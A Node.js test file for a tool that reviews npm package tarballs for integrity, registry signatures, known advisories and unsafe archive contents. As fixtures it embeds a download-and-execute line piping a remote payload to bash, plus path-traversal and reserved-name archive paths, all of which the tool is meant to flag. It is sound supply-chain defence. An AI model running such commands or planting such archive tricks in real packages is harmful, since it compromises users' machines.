import { test } from 'node:test';
import assert from 'node:assert/strict';
import { createHash, generateKeyPairSync, sign } from 'node:crypto';
import { gzipSync, gunzipSync } from 'node:zlib';
import { reviewFreshPackage, reviewRegistryPackage, inspectArchive } from '../src/precheck/fresh-review.js';
import { precheck } from '../src/precheck/index.js';

const pkg = { name: 'fixture', version: '1.0.0' };
const signingKey = generateKeyPairSync('ec', { namedCurve: 'prime256v1' });
const keyDocument = { keys: [{ keyid: 'fixture-key', key: signingKey.publicKey.export({ type: 'spki', format: 'der' }).toString('base64'), expires: null }] };
function artifact(scripts = {}, extra = [], identity = pkg, { root = 'package', rootEntry = false, manifest = {} } = {}) {
  const entries = [...(rootEntry ? [[`${root}/`, '', '5']] : []), [`${root}/package.json`, JSON.stringify({ ...identity, scripts, ...manifest })], ...extra];
  const blocks = entries.flatMap(([name, content, type = '0']) => {
    const body = Buffer.from(content);
    const header = Buffer.alloc(512);
    header.write(name);
    header.write(body.length.toString(8).padStart(11, '0'), 124);
    header.fill(32, 148, 156);
    header.write(type, 156);
    const checksum = header.reduce((sum, byte) => sum + byte, 0);
    header.write(checksum.toString(8).padStart(6, '0') + '\0 ', 148);
    return [header, body, Buffer.alloc((512 - body.length % 512) % 512)];
  });
  const bytes = gzipSync(Buffer.concat([...blocks, Buffer.alloc(1024)]));
  const integrity = `sha512-${createHash('sha512').update(bytes).digest('base64')}`;
  const sig = sign('sha256', Buffer.from(`${identity.name}@${identity.version}:${integrity}`), signingKey.privateKey).toString('base64');
  return { bytes, dist: { tarball: `https://registry.npmjs.org/${identity.name}/-/${identity.name}-${identity.version}.tgz`, integrity, signatures: [{ keyid: 'fixture-key', sig }] } };
}
function responder(bundle, osv = {}) {
  return async (url) => new Response(url.endsWith('/querybatch') ? JSON.stringify({ results: [{}] }) : url.endsWith('/-/npm/v1/keys') ? JSON.stringify(keyDocument) : url.includes('api.osv.dev') ? JSON.stringify(osv) : bundle.bytes);
}

test('review verifies exact archive bytes and queries exact version without execution', async () => {
  const bundle = artifact({ postinstall: 'node install.js' });
  bundle.scripts = { postinstall: 'node install.js' };
  const calls = [];
  const review = await reviewFreshPackage(pkg, bundle, async (url, options) => {
    calls.push({ url, options });
    return responder(bundle)(url);
  });
  assert.equal(review.status, 'reviewed');
  assert.deepEqual(review.installScripts, ['postinstall']);
  assert.equal(review.integrity, bundle.dist.integrity);
  assert.equal(review.signatureVerified, true);
  assert.deepEqual(JSON.parse(calls[2].options.body), { package: { name: pkg.name, ecosystem: 'npm' }, version: pkg.version });
  assert.equal(calls[0].options.redirect, 'error');
});

test('generic review retains the existing fresh-review export', () => {
  assert.equal(reviewFreshPackage, reviewRegistryPackage);
});

test('archive callback runs after verified OSV response and is awaited without exposing bytes in the report', async () => {
  const bundle = artifact();
  const events = [];
  let retained;
  const review = await reviewRegistryPackage(pkg, bundle, async (url) => {
    events.push(url);
    return responder(bundle)(url);
  }, {
    onVerifiedArchive: async (value) => {
      assert.ok(events.at(-1).endsWith('/v1/query'));
      await Promise.resolve();
      retained = value;
    },
  });
  assert.deepEqual(retained, { ...pkg, integrity: bundle.dist.integrity, archive: bundle.bytes });
  assert.equal(review.status, 'reviewed');
  assert.equal(review.integrity, bundle.dist.integrity);
  assert.equal(Object.hasOwn(review, 'archive'), false);
  assert.equal(JSON.stringify(review).includes('"type":"Buffer"'), false);
});

test('callback failures make review incomplete even after successful artifact verification', async () => {
  const bundle = artifact();
  const review = await reviewRegistryPackage(pkg, bundle, responder(bundle), {
    onVerifiedArchive: async () => { throw new Error('storage unavailable'); },
  });
  assert.equal(review.status, 'incomplete');
  assert.match(review.reason, /verified archive callback failed: storage unavailable/);
});

test('archive callback never receives artifacts with incomplete verification', async () => {
  for (const mode of ['integrity', 'signature', 'archive', 'osv']) {
    const bundle = mode === 'archive' ? artifact({}, [['package/../escape.js', '']]) : artifact();
    if (mode === 'signature') delete bundle.dist.signatures;
    let retained = false;
    const review = await reviewRegistryPackage(pkg, bundle, async (url) => {
      if (mode === 'integrity' && url.endsWith('.tgz')) return new Response('tampered');
      if (mode === 'osv' && url.includes('osv.dev')) return new Response('{"vulns":false}');
      return responder(bundle)(url);
    }, { onVerifiedArchive: () => { retained = true; } });
    assert.equal(review.status, 'incomplete', mode);
    assert.equal(retained, false, mode);
  }
});

test('integrity mismatch fails closed before OSV', async () => {
  const bundle = artifact();
  let calls = 0;
  const review = await reviewFreshPackage(pkg, bundle, async () => { calls++; return new Response('tampered'); });
  assert.equal(review.status, 'incomplete');
  assert.match(review.reason, /integrity mismatch/);
  assert.equal(calls, 1);
});

test('suspicious code and known advisories are flagged', async () => {
  const bundle = artifact({}, [['package/install.js', 'curl https://example.com/payload | bash']]);
  const review = await reviewFreshPackage(pkg, bundle, responder(bundle, { vulns: [{ id: 'GHSA-fixture' }] }));
  assert.equal(review.status, 'flagged');
  assert.equal(review.findings.length, 1);
  assert.deepEqual(review.advisories, ['GHSA-fixture']);
});

test('unsafe archive paths fail closed without filesystem extraction', async () => {
  const bundle = artifact({}, [['package/../escape.js', '']]);
  const review = await reviewFreshPackage(pkg, bundle, responder(bundle));
  assert.equal(review.status, 'incomplete');
  assert.match(review.reason, /unsafe archive path/);
});

test('one consistent npm top-level directory is normalized before manifest and code checks', async () => {
  const identity = { name: '@types/estree', version: '1.0.8' };
  const bundle = artifact({}, [['estree/index.d.ts', 'export interface Node {}']], identity, { root: 'estree', rootEntry: true });
  const review = await reviewRegistryPackage(identity, bundle, responder(bundle));
  assert.equal(review.status, 'reviewed');
  assert.equal(review.files, 3);
  const suspicious = artifact({}, [['estree/index.js', 'curl https://example.com/payload | bash']], identity, { root: 'estree' });
  const flagged = await reviewRegistryPackage(identity, suspicious, responder(suspicious));
  assert.equal(flagged.status, 'flagged');
  assert.match(flagged.findings[0], /package\/index.js/);
});

test('mixed archive roots fail even when stripping one component would hide the mismatch', async () => {
  for (const path of ['another/index.js', 'Package/index.js']) {
    const bundle = artifact({}, [[path, '']]);
    const review = await reviewRegistryPackage(pkg, bundle, responder(bundle));
    assert.equal(review.status, 'incomplete');
    assert.match(review.reason, /mixed archive roots/);
  }
});

test('archive paths reject traversal, alternate streams, reserved names and trailing Windows aliases', async () => {
  for (const path of ['package/../escape.js', 'package/./index.js', '/package/index.js', 'package/index.js:payload',
    'package/CON', 'package/aux.txt', 'package/LPT1.js', 'package/COM¹.txt', 'package/NUL .txt',
    'package/subdir./index.js', 'package/subdir /index.js', 'package/index.js.', 'package/index.js ',
    'C:/package/index.js', 'package/back\\slash.js', 'package/index?.js']) {
    const bundle = artifact({}, [[path, '']]);
    const review = await reviewRegistryPackage(pkg, bundle, responder(bundle));
    assert.equal(review.status, 'incomplete', path);
    assert.match(review.reason, /unsafe archive/, path);
  }
});

test('case-colliding files and implicit directories cannot shadow reviewed content', async () => {
  for (const entries of [
    [['package/Package.json', '{}']],
    [['package/index.js', ''], ['package/INDEX.js', '']],
    [['package/lib/first.js', ''], ['package/Lib/second.js', '']],
  ]) {
    const bundle = artifact({}, entries);
    const review = await reviewRegistryPackage(pkg, bundle, responder(bundle));
    assert.equal(review.status, 'incomplete');
    assert.match(review.reason, /case-colliding/);
  }
});

test('file and directory archive path collisions fail in either entry order', async () => {
  for (const entries of [
    [['package/lib', ''], ['package/lib/index.js', '']],
    [['package/lib/index.js', ''], ['package/lib', '']],
  ]) {
    const bundle = artifact({}, entries);
    const review = await reviewRegistryPackage(pkg, bundle, responder(bundle));
    assert.equal(review.status, 'incomplete');
    assert.match(review.reason, /file and directory archive path collision/);
  }
});

test('authenticated archives cannot contain an undeclared node_modules tree', async () => {
  for (const path of ['package/node_modules/hidden/package.json', 'package/lib/node_modules/hidden/index.js', 'package/NODE_MODULES/hidden/index.js']) {
    const bundle = artifact({}, [[path, '{}']]);
    let retained = false;
    const review = await reviewRegistryPackage(pkg, bundle, responder(bundle), { onVerifiedArchive: () => { retained = true; } });
    assert.equal(review.status, 'incomplete');
    assert.match(review.reason, /bundled node_modules/);
    assert.equal(retained, false);
  }
});

test('archive manifests declaring bundled dependencies fail even without a visible dependency tree', async () => {
  for (const field of ['bundledDependencies', 'bundleDependencies']) {
    for (const value of [['hidden'], [], false]) {
      const bundle = artifact({}, [], pkg, { manifest: { [field]: value } });
      const review = await reviewRegistryPackage(pkg, bundle, responder(bundle));
      assert.equal(review.status, 'incomplete');
      assert.match(review.reason, /bundled dependencies/);
    }
  }
});

test('implicit node-gyp installation is flagged even without lifecycle scripts', async () => {
  const bundle = artifact({}, [['package/binding.gyp', '{"targets":[]}']]);
  const review = await reviewFreshPackage(pkg, bundle, responder(bundle));
  assert.equal(review.status, 'flagged');
  assert.match(review.findings.join(' '), /implicit native installation/);
});

test('repeated slash aliases and control characters in archive paths fail closed', async () => {
  for (const path of ['package//install.js', 'package/install\n.js']) {
    const bundle = artifact({}, [[path, '']]);
    const review = await reviewFreshPackage(pkg, bundle, responder(bundle));
    assert.equal(review.status, 'incomplete');
    assert.match(review.reason, /unsafe archive path/);
  }
});

test('single zero termination and concatenated hidden archives are rejected', () => {
  const tar = gunzipSync(artifact().bytes);
  const entries = tar.subarray(0, tar.length - 1024);
  assert.throws(() => inspectArchive(gzipSync(Buffer.concat([entries, Buffer.alloc(512)])), pkg), /termination/);
  for (const zeros of [512, 1024]) {
    assert.throws(() => inspectArchive(gzipSync(Buffer.concat([entries, Buffer.alloc(zeros), tar])), pkg), /termination|trailing/);
  }
});

test('unavailable or invalid vulnerability response fails closed', async () => {
  const bundle = artifact();
  for (const response of [new Response('down', { status: 503 }), new Response('[]'), new Response('{"vulns":false}')]) {
    const review = await reviewFreshPackage(pkg, bundle, async (url) => url.includes('osv.dev') ? response : responder(bundle)(url));
    assert.equal(review.status, 'incomplete');
  }
});

test('missing, unknown, expired and altered registry signatures fail closed', async () => {
  for (const mode of ['missing', 'unknown', 'expired', 'altered']) {
    const bundle = artifact();
    if (mode === 'missing') delete bundle.dist.signatures;
    if (mode === 'unknown') bundle.dist.signatures[0].keyid = 'unknown';
    if (mode === 'altered') bundle.dist.signatures[0].sig = Buffer.from('forged').toString('base64');
    const review = await reviewFreshPackage(pkg, bundle, async (url) => {
      if (mode === 'expired' && url.endsWith('/-/npm/v1/keys')) return new Response(JSON.stringify({ keys: [{ ...keyDocument.keys[0], expires: '2000-01-01T00:00:00Z' }] }));
      return responder(bundle)(url);
    });
    assert.equal(review.status, 'incomplete', mode);
    assert.match(review.reason, /signature/);
  }
});

test('an expired registry key still verifies releases published strictly before its expiry', async () => {
  const bundle = artifact();
  const expiry = '2025-01-29T00:00:00.000Z';
  for (const [publishedAt, expected] of [
    ['2025-01-28T23:59:59.999Z', 'reviewed'],
    [expiry, 'incomplete'],
    ['2025-01-29T00:00:00.001Z', 'incomplete'],
  ]) {
    const review = await reviewRegistryPackage(pkg, bundle, async (url) => {
      if (url.endsWith('/-/npm/v1/keys')) return new Response(JSON.stringify({ keys: [{ ...keyDocument.keys[0], expires: expiry }] }));
      return responder(bundle)(url);
    }, { publishedAt });
    assert.equal(review.status, expected, publishedAt);
    if (expected === 'incomplete') assert.match(review.reason, /signature verification failed/);
  }
});

test('expiring keys reject missing or invalid publication timestamps without assuming an older date', async () => {
  const bundle = artifact();
  for (const publishedAt of [undefined, null, '', 'not a date', 0, {}, []]) {
    const review = await reviewRegistryPackage(pkg, bundle, async (url) => {
      if (url.endsWith('/-/npm/v1/keys')) return new Response(JSON.stringify({ keys: [{ ...keyDocument.keys[0], expires: '2025-01-29T00:00:00.000Z' }] }));
      return responder(bundle)(url);
    }, { publishedAt });
    assert.equal(review.status, 'incomplete', JSON.stringify(publishedAt));
    assert.match(review.reason, /signature verification failed/);
  }
});

test('precheck threads the exact packument publication timestamp into all-age signature verification', async () => {
  const bundle = artifact();
  const report = await precheck('fixture', {
    nowMs: Date.parse('2026-09-06T00:00:00.000Z'), resolve: () => [pkg], reviewAll: true,
    fetchImpl: async (url) => {
      if (url.endsWith('/fixture')) return new Response(JSON.stringify({
        time: { '1.0.0': '2024-09-06T00:00:00.000Z' }, versions: { '1.0.0': { dist: bundle.dist, license: 'MIT' } },
      }));
      if (url.endsWith('/-/npm/v1/keys')) return new Response(JSON.stringify({ keys: [{ ...keyDocument.keys[0], expires: '2025-01-29T00:00:00.000Z' }] }));
      return responder(bundle)(url);
    },
  });
  assert.equal(report.exitCode, 0);
  assert.equal(report.results[0].review.signatureVerified, true);
});

test('fresh review never bypasses install scripts, even when registry omits them', async () => {
  const bundle = artifact({ postinstall: 'node install.js' });
  const nowMs = Date.now();
  const report = await precheck('fixture', {
    nowMs, resolve: () => [pkg],
    fetchImpl: async (url) => url.endsWith('/fixture')
      ? new Response(JSON.stringify({ time: { '1.0.0': new Date(nowMs - 3600000).toISOString() }, versions: { '1.0.0': { dist: bundle.dist, license: 'MIT' } } }))
      : responder(bundle)(url),
  });
  assert.equal(report.blocked.length, 1);
  assert.equal(report.blocked[0].review.status, 'flagged');
  assert.equal(report.blocked[0].vulnerabilityReview.status, 'reviewed');
});

function precheckFixture(bundle, options = {}) {
  const { ageHours = 24 * 365, nowMs = Date.now(), ...opts } = options;
  return precheck('fixture', {
    nowMs, resolve: () => [pkg],
    fetchImpl: async (url) => url.endsWith('/fixture')
      ? new Response(JSON.stringify({
        time: { '1.0.0': new Date(nowMs - ageHours * 3600000).toISOString() },
        versions: { '1.0.0': { dist: bundle.dist, scripts: bundle.scripts, license: 'MIT' } },
      }))
      : responder(bundle)(url),
    ...opts,
  });
}

test('all-age review blocks suspicious code in an old release', async () => {
  const bundle = artifact({}, [['package/index.js', 'curl https://example.com/payload | bash']]);
  const report = await precheckFixture(bundle, { reviewAll: true });
  assert.equal(report.exitCode, 2);
  assert.equal(report.blocked[0].review.status, 'flagged');
  assert.match(report.blocked[0].reasons.join(' '), /download-and-execute pattern/);
  assert.match(report.blocked[0].reasons.join(' '), /artifact review:/);
  assert.doesNotMatch(report.blocked[0].reasons.join(' '), /fresh-release/);
});

test('all-age review blocks a tampered old release before its callback', async () => {
  const bundle = artifact();
  bundle.bytes = Buffer.from('tampered');
  let retained = false;
  const report = await precheckFixture(bundle, { reviewAll: true, onVerifiedArchive: () => { retained = true; } });
  assert.equal(report.exitCode, 2);
  assert.equal(report.blocked[0].review.status, 'incomplete');
  assert.match(report.blocked[0].reasons.join(' '), /artifact review incomplete: archive integrity mismatch/);
  assert.equal(retained, false);
});

test('all-age review retains every exact version from the supplied resolved tree', async () => {
  const tree = [pkg, { name: 'fixture', version: '2.0.0' }];
  const bundles = tree.map((identity) => artifact({}, [], identity));
  const retained = [];
  const nowMs = Date.now();
  const report = await precheck('fixture', {
    nowMs, resolve: () => tree, reviewAll: true,
    onVerifiedArchive: (value) => { retained.push(value); },
    fetchImpl: async (url, options) => {
      if (url.endsWith('/fixture')) return new Response(JSON.stringify({
        time: Object.fromEntries(tree.map(({ version }) => [version, new Date(nowMs - 365 * 24 * 3600000).toISOString()])),
        versions: Object.fromEntries(tree.map(({ version }, index) => [version, { dist: bundles[index].dist, license: 'MIT' }])),
      }));
      if (url.endsWith('/querybatch')) return new Response(JSON.stringify({ results: JSON.parse(options.body).queries.map(() => ({})) }));
      return responder(bundles.find((bundle) => bundle.dist.tarball === url) || bundles[0])(url);
    },
  });
  assert.equal(report.exitCode, 0);
  assert.equal(retained.length, 2);
  for (let index = 0; index < tree.length; index++) {
    assert.deepEqual(retained.find(({ version }) => version === tree[index].version), {
      ...tree[index], integrity: bundles[index].dist.integrity, archive: bundles[index].bytes,
    });
    assert.equal(report.results[index].review.integrity, bundles[index].dist.integrity);
  }
  assert.equal(JSON.stringify(report).includes('"type":"Buffer"'), false);
});

test('all-age callback failure blocks the precheck with an incomplete review', async () => {
  const report = await precheckFixture(artifact(), {
    reviewAll: true, onVerifiedArchive: async () => { throw new Error('storage unavailable'); },
  });
  assert.equal(report.exitCode, 2);
  assert.match(report.blocked[0].reasons.join(' '), /artifact review incomplete: verified archive callback failed/);
});

test('all-age review warns on established scripts and preserves fresh-script blocking', async () => {
  const bundle = artifact({ postinstall: 'node install.js' });
  bundle.scripts = { postinstall: 'node install.js' };
  const old = await precheckFixture(bundle, { reviewAll: true });
  assert.equal(old.exitCode, 1);
  assert.equal(old.warned[0].review.status, 'reviewed');
  assert.doesNotMatch(old.warned[0].reasons.join(' '), /fresh archive/);
  const fresh = await precheckFixture(bundle, { reviewAll: true, ageHours: 1 });
  assert.equal(fresh.exitCode, 2);
  assert.match(fresh.blocked[0].reasons.join(' '), /fresh archive contains install scripts/);
});

test('default precheck keeps the existing old-release behavior without retaining archives', async () => {
  let retained = false;
  const report = await precheckFixture(artifact({}, [['package/index.js', 'curl https://example.com/payload | bash']]), {
    onVerifiedArchive: () => { retained = true; },
  });
  assert.equal(report.exitCode, 0);
  assert.equal(Object.hasOwn(report.results[0], 'review'), false);
  assert.equal(retained, false);
});
